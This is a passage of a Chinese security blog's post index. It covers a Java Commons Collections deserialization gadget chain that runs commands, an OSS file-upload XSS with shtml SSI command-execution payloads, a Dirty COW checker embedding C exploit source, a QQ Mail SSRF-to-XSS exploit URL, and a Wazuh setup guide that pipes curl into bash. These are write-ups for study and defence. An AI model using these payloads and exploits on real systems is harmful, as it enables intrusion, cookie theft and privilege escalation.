((Runtime)Runtime.class.getMethod(\"getRuntime\",null).invoke(null,null)).exec(\"gedit\"); */ new InvokerTransformer( \"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125; ), new InvokerTransformer( \"invoke\", new Class[] &#123;Object.class,Object[].class &#125;, new Object[] &#123;null, null &#125; ), new InvokerTransformer( \"exec\", new Class[] &#123;String[].class &#125;, new Object[] &#123; \"whoami &gt; /tmp/poc\" &#125; //目标机器上反序列化后执行的命令 ) &#125;; //transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作 Transformer transformedChain = new ChainedTransformer(transformers); //BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict //Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;(); Map&lt;String,String&gt; BeforeTransformerMap = new HashMap&lt;String,String&gt;(); BeforeTransformerMap.put(\"hello\", \"hello\"); //Map数据结构，转换后的Map /* TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。 第一个参数为待转化的Map对象 第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空） 第三个参数为Map对象内的value要经过的转化方法。 */ //TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）); Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, AfterTransformerMap); File f = new File(\"/tmp/payload.bin\"); //序列化后的payload ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(instance); &#125;&#125;/*思路:构建BeforeTransformerMap的键值对，为其赋值， 利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme 对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行 执行本质: ((Runtime)Runtime.class.getMethod(\"getRuntime\",null).invoke(null,null)).exec(.........) 利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()*/ java反序列化漏洞触发链(Collections)","tags":[{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"安全分析","slug":"安全分析","permalink":"http://pirogue.org/tags/安全分析/"},{"name":"java反序列化","slug":"java反序列化","permalink":"http://pirogue.org/tags/java反序列化/"},{"name":"Apache Commons Collections","slug":"Apache-Commons-Collections","permalink":"http://pirogue.org/tags/Apache-Commons-Collections/"}]},{"title":"阿里云OSS约等于文件上传漏洞？","date":"2017-09-29T09:59:34.000Z","path":"2017/09/29/aliyunoss/","text":"首先声明这是一篇标题党的文章，阿里云OSS不被这个锅，锅其实还是在企业或者说是用户。 前言之所以要写这篇口水文，是因为最近在检测自家公司产品时发现存在这个问题，同时不久在测试某src的某系统时也存在类似这种问题，所以个人认为还是要提高一些警惕，让开发或测试者尽量消除不必要的麻烦，不要错误的认为文件托管在oss就可以忽略站内的上传功能存在的安全隐患。 概述首先借用阿里云oss首页的介绍性文字来解释下oss是什么：1海量、安全、低成本、高可靠的云存储服务，提供99.99999999%的数据可靠性。使用RESTful API 可以在互联网任何位置存储和访问，容量和处理能力弹性扩展，多种存储类型供选择全面优化存储成本。 简单可以理解为企业自身的文件存储服务器。问题出在站点的上传功能，存在任意文件上传，但因为上传到的是oss或文件存储服务器，所以不论是什么类型的脚本都是不解析的，访问会直接下载回来，那作为开发者会高枕无忧了吗？然并卵，我还可以上传一个内容存在xss payload的hack.html的文件，服务器便会静态文件进行解析；重点来了，可能企业在使用oss服务时，使用的域名是img-oss.yourcompanydomain.com，而在你公司的sso或产品为了跨域在开发时set-cookie：*.yourcompanydomain.com，那攻击者就可以拿着img-oss.yourcompanydomain.com/hack.html找对应的场景或发给公司的员工，打开后cookie可能就被“借”走了。 总结两点： 任意文件上传； 站点可以跨域 你看不见我~文末我准备追加一种姿势 案例复现案例一：0x01:set-cookie 0x02: 文件上传，前端验证 先上传图片，然后通过bp抓包，修改后缀为html，进行上传 访问即可打印弹出cookie 案例二：0x01: 某src在上传文件时不仅会校验文件后缀，在后端也会校验文件头 0x02: 绕过上传 上传后的response html上传成功，发现其setcookie也是该业务系统全域名的，但使用的oss服务是阿里的oss相关域名isvstore.oss-cn-hangzhou.aliyuncs.com，不是使用其业务系统的域名，这样这两个域名之间是不能相互跨域的，但aliyuncs.com这个域名如果有业务系统，可能也会被利用。但在我测试过之后发现aliyuncs.com这个域名没有业务系统。所以没有影响，才在这里列出来。 但问题是相通的。 传统解决方案 后端校验文件后缀类型； 牛逼点对文件进行重绘； 针对oss解决方案 oss接口开发key管理部分，不同的key可以配置不同类型文件上传权限（服务端改key即可）； 在使用oss时，最好申请一个专用的域名提供文件服务器使用。 文末彩蛋除了html，你是否知道还有一种文件在特殊场景下会被利用呢？那就是shtml！ 1234shtml用的是SSI指令，SSI是为WEB服务器提供的一套命令，这些命令只要直接嵌入到HTML文档的注释内容之中即可。&lt;!--#include file=&quot;/home/www/user7511/nav_foot.htm&quot;--&gt; //可以用来读文件&lt;!--#exec cmd=&quot;ifconfig&quot;--&gt; //可以用来执行命令&lt;!--#include virtual=&quot;/includes/header.html&quot; --&gt; //也是读文件 与FILE不同他支持绝对路径和../来跳转到父目录 而file只能读取当前目录下的 在某众测项目时，曾利用过，当时的情景是一个上传附件的功能存在任意文件上传，asp、aspx、jsp、php等等上传之后，访问都会进行下载，而上传html则造成xss，而xss的奖金并不高；为了提升漏洞的危害，上传了一个shtml，里面的payload就是执行命令，命令执行奖金达到8K。 ps:shtml这个姿势从t00ls论坛上学到的。","tags":[{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://pirogue.org/tags/渗透测试/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://pirogue.org/tags/文件上传漏洞/"},{"name":"阿里云OSS","slug":"阿里云OSS","permalink":"http://pirogue.org/tags/阿里云OSS/"}]},{"title":"CVE-2016-5195(Dirtycow)检测脚本及Ubuntu升级内核方法","date":"2017-09-12T06:58:49.000Z","path":"2017/09/12/dirtycow/","text":"漏洞编号CVE-2016-5195 漏洞名称脏牛（Dirty COW） 风险等级高 漏洞危害黑客可以通过远程入侵获取低权限用户shell后，然后利用该漏洞在全版本Linux系统上实现本地提权，从而获取服务器root权限。 漏洞利用条件黑客可以通过远程入侵获取低权限用户shell后, 才能进一步利用该漏洞。 漏洞影响范围根据Linux内核官方评估自2007年来发行的 &gt;=2.6.22的内核版本全部受影响。 漏洞验证我们先通过一个低权限用户meicai登录，通过rz上传一个cowroot二进制漏洞利用程序；给cowroot执行权限后执行，发现自动提升到root权限。 请不要在生产环境通过漏洞利用程序测试此漏洞，可能造成系统卡死。为防止系统卡死可执行echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs ，关闭pdflush刷新。 漏洞验证poc为防止漏洞利用程序造成的危害，我特意编写了一个可以验证漏洞是否存在的python脚本，执行过后可检测系统是否存在漏洞。请执行3次左右，防止漏报情况。 存在漏洞： 不存在漏洞： 漏洞修复 Ubuntu 内核升级: 1、查看是否有最新更新包： dpkg -l | grep linux 2、更新列表：apt-get update 或apt update 3、升级： Ubuntu12.04版本：apt-get install linux-generic Ubuntu14.04版本：apt-get upgrade或apt upgrade 4、reboot重启服务器 注意：机器上在做了上述升级后还会存在漏洞未修复！ 系统提示我们正在使用的版本安全更新只到2016-08-04这一天，所以官方给出两种解决办法： 升级Ubuntu 14.04 LTS 到 Ubuntu 16.04 LTS：sudo do-release-upgrade或者 切换到当前受社区安全支持的内核小版本升级：sudo apt-get install linux-image-generic-lts-xenial linux-generic-lts-xenial 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#!/usr/bin/env python#coding=utf-8#-------------------------------------------------------------------------------# Name: Linux内核通用提权漏洞检测脚本（Dirty COW）# vuln: CVE-2016-5195: https://access.redhat.com/security/cve/CVE-2016-5195# Author: pirogue# Created: 2017-9-11 11:22:08# Site: http://pirogue.org#-------------------------------------------------------------------------------import subprocessfrom subprocess import Popen, PIPEimport os# 漏洞利用验证代码poc_code = &quot;&quot;&quot;/* * main.c * * Created on: Oct 21, 2016 * Author: 5t4rk */ #include&lt;stdio.h&gt; #include&lt;sys/mman.h&gt; #include&lt;fcntl.h&gt; #include&lt;pthread.h&gt; #include&lt;string.h&gt; void *map; int f; struct stat st; char* name; void * madviseThread(void *arg) &#123; char *str; str = (char *) arg; int i, c = 0; for (i = 0; i &lt; 100000000; i++) &#123; c += madvise(map, 100, MADV_DONTNEED); &#125; printf(&quot;madvise %d\\\\n&quot;, c); &#125; void * procselfmemThread(void *arg) &#123; char *str; str = (char *) arg; int f = open(&quot;/proc/self/mem&quot;, O_RDWR); int i, c = 0; for (i = 0; i &lt; 100000000; i++) &#123; lseek(f, map, SEEK_SET); c += write(f, str, strlen(str)); &#125; printf(&quot;procselfmem %d\\\\n&quot;, c); &#125; int main(int argc, char *argv[]) &#123; if (argc &lt; 3) return 1; pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;st); name = argv[1]; map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0); printf(&quot;mmap %x\\\\n&quot;, map); pthread_create(&amp;pth1, NULL, madviseThread, argv[1]); pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]); pthread_join(pth1, NULL); pthread_join(pth2, NULL); return 0; &#125; &quot;&quot;&quot;# 临时文件内容test_content = &quot;noo&quot;# 本地写入文件方法def write_poc(code, file): with open(file, &apos;w&apos;) as f: f.write(code)# 编译pocdef mc_gcc(file): pobj = Popen(&apos;gcc &apos;+file+&quot; -lpthread -o mc_poc&quot;, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) result = pobj.communicate() return result# 执行pocdef mc_binx(file): pobj = Popen(&apos;./&apos;+file+&quot; mc_tmp yes|ps -ef|grep &apos;[m]c_poc mc_tmp&apos;|awk &apos;&#123;print $2&#125;&apos;|xargs kill -9&quot;, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) result = pobj.communicate() return result# 判断是否存在漏洞def mc_vuln(file): pobj = Popen(&apos;cat &apos;+file, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) result = pobj.communicate() return result[0]if __name__ == &quot;__main__&quot;: write_poc(poc_code, &apos;mc_poc.c&apos;) write_poc(test_content, &apos;mc_tmp&apos;) mc_gcc(&apos;mc_poc.c&apos;) mc_binx(&apos;mc_poc&apos;) # print type(mc_vuln(&apos;mc_tmp&apos;)) if mc_vuln(&apos;mc_tmp&apos;) == &apos;yes&apos;: print &apos;The os is vulnerability!Please upgrade the kernel.&apos; elif mc_vuln(&apos;mc_tmp&apos;) == &apos;noo&apos;: print &apos;You are Lucky dog~ No vuln.&apos; 在测试过程中发现poc在执行时会导致机器cpu飙升，于是在代码的逻辑里将poc二进制文件执行过后，马上通过Linux执行杀掉它的进程，防止影响机器上的业务。所以可能会导致明明存在漏洞，而二进制程序没有执行完就被kill掉了，进而没有检测出漏洞。多执行几次python dirtycow.py，只要出现一次提示存在漏洞，那就是存在漏洞了。蛤~","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"甲方安全","slug":"甲方安全","permalink":"http://pirogue.org/tags/甲方安全/"},{"name":"脏牛","slug":"脏牛","permalink":"http://pirogue.org/tags/脏牛/"},{"name":"dirtycow","slug":"dirtycow","permalink":"http://pirogue.org/tags/dirtycow/"},{"name":"CVE-2016-5195","slug":"CVE-2016-5195","permalink":"http://pirogue.org/tags/CVE-2016-5195/"}]},{"title":"QQ邮箱反射型xss漏洞","date":"2017-08-25T09:40:42.000Z","path":"2017/08/25/qqmailxss/","text":"起因甲方“一个人的安全部”的时候，一个研发的同事在设计一项报表功能时，因为受到邮箱的安全限制无法很好的实现，于是将情况反馈给我。说实话，我对浏览器的安全也不太了解，案头的书翻了几页就没再动过，于是对比了腾讯邮箱的做法，发现了这个xss。 背景公司使用coremail搭建企业邮箱，开发做了一个通过邮件发送html报表的周报，但在此邮件内有链接地址。邮箱的域名是a.com，而报表中的链接是b.com，当用户打开a.com内的报表邮件，点击其中的链接；因为邮件的内容是通过iframe来加载html报表，同时coremail将iframe加入了内容安全策略(CSP)限制(sandbox=“allow-same-origin allow-popups”)。所以，点击链接虽然可以跳转到b.com，但b.com页面有js脚本，sandbox不允许执行脚本(allow-scripts)，会导致新打开的链接不会加载脚本执行，效果当然也不是开发想要的效果了。 当然通过让厂商修改iframe的sandbox属性，改为sandbox=”allow-same-origin allow-popups allow-popups-to-escape-sandbox”,即可解决这个问题，但会影响邮箱的安全性。 于是我打开qq邮箱，发现QQ邮箱并没有这个iframe策略，而是通过一个三方“云端安全检测”，对邮件内连接进行拦截，提示用户要访问的页面可能有风险。 被src拒绝的“逻辑漏洞”于是多打开了几封QQ邮件，点击了邮件内的链接，发现腾讯对智联招聘、拉钩等招聘网站的链接不会进行拦截，直接放行跳转，所以这其中是否存在一定的逻辑绕过呢？ 测试过程就省略了，说结果吧，个人认为验证逻辑上还是有些问题： 当邮件内容出现链接时，点击跳转，默认QQ邮箱会进行在云端进行拦截检测。但是会有白名单机制，比如 http://www.lagou.com ，会把拉钩的招聘链接进行放行，云端安全检测检-&gt;进行跳转放行，无任何提示。 现有的逻辑如下： https://www.lagou.com 不放行（因为https，非白名单） www.lagou.com 不放行（不带有http，非白名单） http://xss.pirogue.org 不放行（非白名单） 等等其他域名都不放行。 但当第一行是http://www.lagou.com ，第二行的链接都会放行（除去色情或被举报的网址）。 比如： 两个链接都会进行跳转。 如果第一个是http://www.lagou.com ，第二行的网址是一个钓鱼或挂马的链接，却没有被举报。那用户便可能会受到攻击。 后来的结果是大家都知道了，被忽略了。这点我没啥争议，不是漏洞也没关系，我想一探究竟，它是通过js获取邮件内的链接，遇到点击事件就丢到三方“云端url检测”的吗？所以在审计js代码的过程中，一不小心发现了一个类ssrf漏洞。 鸡肋ssrf变身反射型xssssrf漏洞 原功能链接： https://mail.qq.com/cgi-bin/magurl?sid=e6tvxdAtN0XOUGoz&amp;act=rep&amp;url=http://x.soso.com/js/xf/xflib2.0.js 这个cgi读取到了js的内容 漏洞截图： https://mail.qq.com/cgi-bin/magurl?sid=e6tvxdAtN0XOUGoz&amp;act=rep&amp;url=http://ip.qq.com/ 但此ssrf限制了域名，比如.qq.com，.soso.com，等等腾讯自己的域名。所以除非你能再挖到腾讯自己的域名下的漏洞来结合使用。可是我们还可以测试一下是否可以绕过域名的白名单机制。 反射型xss漏洞于是我构造了如下的url，成功绕过了白名单，提交了此漏洞： 构造的恶意链接：http://mail.qq.com.pirogue.org/qq.com.html内容如下： Exp: https://mail.qq.com/cgi-bin/magurl?sid=e6tvxdAtN0XOUGoz&amp;act=rep&amp;url=http://mail.qq.com.pirogue.org/qq.com.html 仔细看url链接里面存在一个sid，在后来的tsrc自测时发现，此sid只能是收件人的sid才能触发漏洞。额，有点self-xss的意思咯。但tsrc还是根据可能的危害程度，给了漏洞中危的回复。 结语之前在搞一个目标的时候还挖到了一个QQ企业邮箱的存储型xss，但那个存储型xss没啥技术含量，而这个反射的起因到结果还是挺有趣的，所以迫不及待的想分享给大家。","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://pirogue.org/tags/渗透测试/"},{"name":"xss","slug":"xss","permalink":"http://pirogue.org/tags/xss/"},{"name":"QQ邮箱","slug":"QQ邮箱","permalink":"http://pirogue.org/tags/QQ邮箱/"},{"name":"ssrf","slug":"ssrf","permalink":"http://pirogue.org/tags/ssrf/"}]},{"title":"Wazuh搭建","date":"2017-08-24T11:21:38.000Z","path":"2017/08/24/WAZUH/","text":"WAZUH架构图分布式 单台部署 Install Wazuh server添加CentOS wazuh源123456789$ cat &gt; /etc/yum.repos.d/wazuh.repo &lt;&lt;\\EOF[wazuh_repo]gpgcheck=1gpgkey=https://packages.wazuh.com/key/GPG-KEY-WAZUHenabled=1name=CentOS-$releasever - Wazuhbaseurl=https://packages.wazuh.com/yum/el/$releasever/$basearchprotect=1EOF 安装Wazuh-manager1$ yum install wazuh-manager 查看Wazuh运行状态123456789[root@localhost init.d]# service wazuh-manager statusossec-monitord is running...ossec-logcollector is running...ossec-remoted is running...ossec-syscheckd is running...ossec-analysisd is running...ossec-maild not running...ossec-execd is running...wazuh-modulesd is running... 安装Wazuh API 安装NodeJS [root@localhost opt]# curl –silent –location https://rpm.nodesource.com/setup_6.x | bash - 1234567891011121314151617181920212223242526272829303132## Installing the NodeSource Node.js 6.x repo...## Inspecting system...+ rpm -q --whatprovides redhat-release || rpm -q --whatprovides centos-release || rpm -q --whatprovides cloudlinux-release || rpm -q --whatprovides sl-release+ uname -m## Confirming &quot;el6-x86_64&quot; is supported...+ curl -sLf -o /dev/null &apos;https://rpm.nodesource.com/pub_6.x/el/6/x86_64/nodesource-release-el6-1.noarch.rpm&apos;## Downloading release setup RPM...+ mktemp+ curl -sL -o &apos;/tmp/tmp.l3Z6OzvS3W&apos; &apos;https://rpm.nodesource.com/pub_6.x/el/6/x86_64/nodesource-release-el6-1.noarch.rpm&apos;## Installing release setup RPM...+ rpm -i --nosignature --force &apos;/tmp/tmp.l3Z6OzvS3W&apos;## Cleaning up...+ rm -f &apos;/tmp/tmp.l3Z6OzvS3W&apos;## Checking for existing installations...+ rpm -qa &apos;node|npm&apos; | grep -v nodesource## Run `yum install -y nodejs` (as root) to install Node.js 6.x and npm.## You may also need development tools to build native addons:## `yum install -y gcc-c++ make` [root@localhost opt]# ls [root@localhost opt]# yum install nodejs 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.comnodesource | 2.5 kB 00:00 nodesource/primary_db | 43 kB 00:00 解决依赖关系--&gt; 执行事务检查---&gt; Package nodejs.x86_64 2:6.11.1-1nodesource.el6 will be 安装--&gt; 完成依赖关系计算依赖关系解决========================================================================================================================================================== 软件包 架构 版本 仓库 大小==========================================================================================================================================================正在安装: nodejs x86_64 2:6.11.1-1nodesource.el6 nodesource 9.5 M事务概要==========================================================================================================================================================Install 1 Package(s)总下载量：9.5 MInstalled size: 33 M确定吗？[y/N]：y下载软件包：nodejs-6.11.1-1nodesource.el6.x86_64.rpm | 9.5 MB 00:20 warning: rpmts_HdrFromFdno: Header V4 RSA/SHA1 Signature, key ID 34fa74dd: NOKEYRetrieving key from file:///etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-ELImporting GPG key 0x34FA74DD: Userid : NodeSource &lt;gpg-rpm@nodesource.com&gt; Package: nodesource-release-el6-1.noarch (installed) From : /etc/pki/rpm-gpg/NODESOURCE-GPG-SIGNING-KEY-EL确定吗？[y/N]：y运行 rpm_check_debug 执行事务测试事务测试成功执行事务Warning: RPMDB altered outside of yum. 正在安装 : 2:nodejs-6.11.1-1nodesource.el6.x86_64 1/1 Verifying : 2:nodejs-6.11.1-1nodesource.el6.x86_64 1/1 已安装: nodejs.x86_64 2:6.11.1-1nodesource.el6 完毕！ 安装Wazuh API [root@localhost opt]# yum install wazuh-api 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.com解决依赖关系--&gt; 执行事务检查---&gt; Package wazuh-api.x86_64 0:2.0.1-1.el6 will be 安装--&gt; 完成依赖关系计算依赖关系解决========================================================================================================================================================== 软件包 架构 版本 仓库 大小==========================================================================================================================================================正在安装: wazuh-api x86_64 2.0.1-1.el6 wazuh_repo 2.0 M事务概要==========================================================================================================================================================Install 1 Package(s)总下载量：2.0 MInstalled size: 7.8 M确定吗？[y/N]：y下载软件包：wazuh-api-2.0.1-1.el6.x86_64.rpm | 2.0 MB 00:04 运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在安装 : wazuh-api-2.0.1-1.el6.x86_64 1/1 Installing for SysVinitWAZUH-API is not running.WAZUH-API started.Don&apos;t forget to run the configuration script after installation: /var/ossec/api/scripts/configure_api.shWarning: Minimal supported version is 2.7root 21160 5.0 0.2 614120 7952 pts/0 Rl+ 15:12 0:00 /usr/bin/node /var/ossec/api/app.jsWAZUH-API stopped.WAZUH-API started. Verifying : wazuh-api-2.0.1-1.el6.x86_64 1/1 已安装: wazuh-api.x86_64 0:2.0.1-1.el6 完毕！ wazuh-api状态错误 1234567[root@localhost Python-2.7.3]# service wazuh-api statusWAZUH-API is stopped.Last 20 log entries:WazuhAPI 2017-08-01 15:12:23: ERROR: No suitable Python version found. This application requires Python 2.7 or newer. Exiting.Full log: /var/ossec/logs/api.log Cent0S 6安装python27 12$ yum install -y centos-release-scl$ yum install -y python27 查看wazuh-api状态 1234[root@localhost Python-2.7.3]# service wazuh-api startWAZUH-API started.[root@localhost Python-2.7.3]# service wazuh-api statusWAZUH-API is running. 安装 Filebeat1234567891011[root@localhost opt]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch[root@localhost opt]# cat &gt; /etc/yum.repos.d/elastic.repo &lt;&lt; EOF&gt; [elastic-5.x]&gt; name=Elastic repository for 5.x packages&gt; baseurl=https://artifacts.elastic.co/packages/5.x/yum&gt; gpgcheck=1&gt; gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch&gt; enabled=1&gt; autorefresh=1&gt; type=rpm-md&gt; EOF [root@localhost opt]# yum install filebeat 123456789101112131415161718192021222324252627282930313233343536373839404142已加载插件：fastestmirror设置安装进程Loading mirror speeds from cached hostfile * base: mirrors.aliyun.com * extras: mirrors.aliyun.com * updates: mirrors.aliyun.comelastic-5.x | 1.3 kB 00:00 elastic-5.x/primary | 81 kB 00:00 elastic-5.x 206/206解决依赖关系--&gt; 执行事务检查---&gt; Package filebeat.x86_64 0:5.5.1-1 will be 安装--&gt; 完成依赖关系计算依赖关系解决========================================================================================================================================================== 软件包 架构 版本 仓库 大小==========================================================================================================================================================正在安装: filebeat x86_64 5.5.1-1 elastic-5.x 8.7 M事务概要==========================================================================================================================================================Install 1 Package(s)总下载量：8.7 MInstalled size: 29 M确定吗？[y/N]：y下载软件包：filebeat-5.5.1-x86_64.rpm | 8.7 MB 06:35 运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在安装 : filebeat-5.5.1-1.x86_64 1/1 Verifying : filebeat-5.5.1-1.x86_64 1/1 已安装: filebeat.x86_64 0:5.5.1-1 完毕！ 下载Filebeat配置文件 1234567891011121314151617181920212223242526[root@localhost opt]# curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/2.0/extensions/filebeat/filebeat.yml[root@localhost opt]# ls /etc/filefilebeat/ filesystems [root@localhost opt]# ls /etc/filebeat/filebeat.filebeat.full.yml filebeat.template-es2x.json filebeat.template-es6x.json filebeat.template.json filebeat.yml[root@localhost opt]# ls /etc/filebeat/filebeat.filebeat.full.yml filebeat.template-es2x.json filebeat.template-es6x.json filebeat.template.json filebeat.yml[root@localhost opt]# ls /etc/filebeat/filebeat.yml /etc/filebeat/filebeat.yml[root@localhost opt]# cat /etc/filebeat/filebeat.yml filebeat: prospectors: - input_type: log paths: - &quot;/var/ossec/logs/alerts/alerts.json&quot; document_type: json json.message_key: log json.keys_under_root: true json.overwrite_keys: trueoutput: logstash: # The Logstash hosts hosts: [&quot;YOUR_ELASTIC_SERVER_IP:5000&quot;]# ssl:# certificate_authorities: [&quot;/etc/filebeat/logstash.crt&quot;] 修改elastic_server_ip [root@localhost opt]# vi /etc/filebeat/filebeat.yml 12345678910111213141516filebeat: prospectors: - input_type: log paths: - &quot;/var/ossec/logs/alerts/alerts.json&quot; document_type: json json.message_key: log json.keys_under_root: true json.overwrite_keys: trueoutput: logstash: # The Logstash hosts hosts: [&quot;192.168.1.43:5000&quot;]# ssl:# certificate_authorities: [&quot;/etc/filebeat/logstash.crt&quot;] 添加Filebeat服务并启动 123456789101112[root@localhost opt]# chkconfig --add filebeat[root@localhost opt]# service filebeat startStarting filebeat: 2017/08/01 10:06:00.996092 beat.go:285: INFO Home path: [/usr/share/filebeat] Config path: [/etc/filebeat] Data path: [/var/lib/filebeat] Logs path: [/var/log/filebeat]2017/08/01 10:06:00.996210 beat.go:186: INFO Setup Beat: filebeat; Version: 5.5.12017/08/01 10:06:00.996254 metrics.go:23: INFO Metrics logging every 30s2017/08/01 10:06:00.996500 logstash.go:90: INFO Max Retries set to: 32017/08/01 10:06:00.996763 outputs.go:108: INFO Activated logstash as output plugin.2017/08/01 10:06:00.997506 publish.go:295: INFO Publisher name: localhost.localdomain2017/08/01 10:06:01.008432 async.go:63: INFO Flush Interval set to: 1s2017/08/01 10:06:01.008471 async.go:64: INFO Max Bulk Size set to: 2048Config OK [确定] Install Elastic Stack安装 Java JRE (Logstash和Elasticsearch必要的依赖)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677[root@localhost ~]# cd /opt/[root@localhost opt]# ls[root@localhost opt]# curl -Lo jre-8-linux-x64.rpm --header &quot;Cookie: oraclelicense=accept-securebackup-cookie&quot; &quot;http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jre-8u144-linux-x64.rpm&quot; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 56.4M 100 56.4M 0 0 20.1M 0 0:00:02 0:00:02 --:--:-- 23.3M[root@localhost opt]# ll总用量 57832-rw-r--r--. 1 root root 59219102 8月 22 14:45 jre-8-linux-x64.rpm[root@localhost opt]# rpm -qlp jre-8-linux-x64.rpm &gt; /dev/null 2&gt;&amp;1 &amp;&amp; echo &quot;Java package downloaded successfully&quot; || echo &quot;Java package did not download successfully&quot;Java package downloaded successfully[root@localhost opt]# yum install jre-8-linux-x64.rpm已加载插件：fastestmirror设置安装进程诊断 jre-8-linux-x64.rpm: jre1.8.0_144-1.8.0_144-fcs.x86_64jre-8-linux-x64.rpm 将被安装base | 3.7 kB 00:00 base/primary_db | 4.7 MB 00:00 extras | 3.4 kB 00:00 extras/primary_db | 29 kB 00:01 updates | 3.4 kB 00:00 updates/primary_db | 2.5 MB 00:05 解决依赖关系--&gt; 执行事务检查---&gt; Package jre1.8.0_144.x86_64 0:1.8.0_144-fcs will be 安装--&gt; 完成依赖关系计算依赖关系解决================================================================================================================================================ 软件包 架构 版本 仓库 大小================================================================================================================================================正在安装: jre1.8.0_144 x86_64 1.8.0_144-fcs /jre-8-linux-x64 133 M事务概要================================================================================================================================================Install 1 Package(s)总文件大小：133 MInstalled size: 133 M确定吗？[y/N]：y下载软件包：运行 rpm_check_debug 执行事务测试事务测试成功执行事务 正在安装 : jre1.8.0_144-1.8.0_144-fcs.x86_64 1/1 Unpacking JAR files... plugin.jar... javaws.jar... deploy.jar... rt.jar... jsse.jar... charsets.jar... localedata.jar... Verifying : jre1.8.0_144-1.8.0_144-fcs.x86_64 1/1 已安装: jre1.8.0_144.x86_64 0:1.8.0_144-fcs 完毕！[root@localhost opt]# rm jre-8-linux-x64.rpmrm：是否删除普通文件 &quot;jre-8-linux-x64.rpm&quot;？y[root@localhost opt]# ls[root@localhost opt]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch[root@localhost opt]# ls[root@localhost opt]# cat &gt; /etc/yum.repos.d/elastic.repo &lt;&lt; EOF&gt; [elastic-5.x]&gt; name=Elastic repository for 5.x packages&gt; baseurl=https://artifacts.elastic.co/packages/5.x/yum&gt; gpgcheck=1&gt; gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch&gt; enabled=1&gt; autorefresh=1&gt; type=rpm-md&gt; EOF 安装elasticsearch12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364[root@localhost opt]# yum install elasticsearch已加载插件：fastestmirror设置安装进程Determining fastest mirrors * base: mirrors.btte.net * extras: mirrors.tuna.tsinghua.edu.cn * updates: mirror.bit.edu.cnelastic-5.x | 1.3 kB 00:00 elastic-5.x/primary | 86 kB 00:00 elastic-5.x 218/218解决依赖关系--&gt; 执行事务检查---&gt; Package elasticsearch.noarch 0:5.5.2-1 will be 安装--&gt; 完成依赖关系计算依赖关系解决================================================================================================================================================ 软件包 架构 版本 仓库 大小================================================================================================================================================正在安装: elasticsearch noarch 5.5.2-1 elastic-5.x 32 M事务概要================================================================================================================================================Install 1 Package(s)总下载量：32 MInstalled size: 36 M确定吗？[y/N]：y下载软件包：elasticsearch-5.5.2.rpm | 32 MB 09:03 运行 rpm_check_debug 执行事务测试事务测试成功执行事务Creating elasticsearch group... OKCreating elasticsearch user... OK 正在安装 : elasticsearch-5.5.2-1.noarch 1/1 ### NOT starting on installation, please execute the following statements to configure elasticsearch service to start automatically using chkconfig sudo chkconfig --add elasticsearch### You can start elasticsearch service by executing sudo service elasticsearch start Verifying : elasticsearch-5.5.2-1.noarch 1/1 已安装: elasticsearch.noarch 0:5.5.2-1 完毕！[root@localhost opt]# chkconfig --add elasticsearch[root@localhost opt]# service elasticsearch start正在启动 elasticsearch： [确定][root@localhost opt]# curl https://raw.githubusercontent.com/wazuh/wazuh-kibana-app/master/server/startup/integration_files/template_file.json | curl -XPUT &apos;http://localhost:9200/_template/wazuh&apos; 